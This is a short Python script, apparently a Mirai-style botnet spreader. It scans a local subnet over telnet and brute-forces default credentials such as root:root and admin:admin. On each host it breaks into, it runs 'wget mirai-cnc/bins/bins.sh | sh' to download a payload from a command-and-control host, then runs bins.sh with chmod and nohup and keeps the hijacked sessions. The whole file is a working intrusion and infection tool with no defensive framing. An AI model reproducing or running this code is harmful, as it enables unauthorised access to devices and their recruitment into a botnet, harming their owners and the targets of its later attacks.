import telnetlib

base_addr = "192.168.10."

credentials = [
    "root:root",
    "admin:admin",
    "guest:guest",
    "user:user",
    "admin:admin1234"
]
connections = []

for ip in range(1, 255):
    if ip == 10:
        continue
    ip = base_addr + str(ip)
    invalid_usernames = []
    valid_pairs = []
    for c in credentials:
        tn = telnetlib.Telnet()
        user,password = c.split(":")
        if user in invalid_usernames:
            continue
        try:
            tn.open(ip)
        except Exception as e:
            continue
        tn.read_until(b"login: ")
        tn.write(user.encode("ascii")+b"\n")
        response = tn.read_until(b"Password: ", timeout=1)
        if b"Password" not in response:
            invalid_usernames.append(user)
            tn.close()
            continue
        tn.write(password.encode("ascii")+b"\n")
        response = tn.read_until(b"$", timeout=1)
        if b"$" not in response:
            tn.close()
            continue
        print(response)
        valid_pairs.append(c)
        tn.write(b"wget mirai-cnc/bins/bins.sh | sh\n")
        response = tn.read_until(b"$", timeout=2)
        print(response)
        tn.write(b"chmod +x bins.sh\n")
        tn.write(b"nohup ./bins.sh\n")
        print("\n\n\n\n\n")
        response = tn.read_until(b"Connected", timeout=5)
        print(response)
        input()
        connections.append(tn)
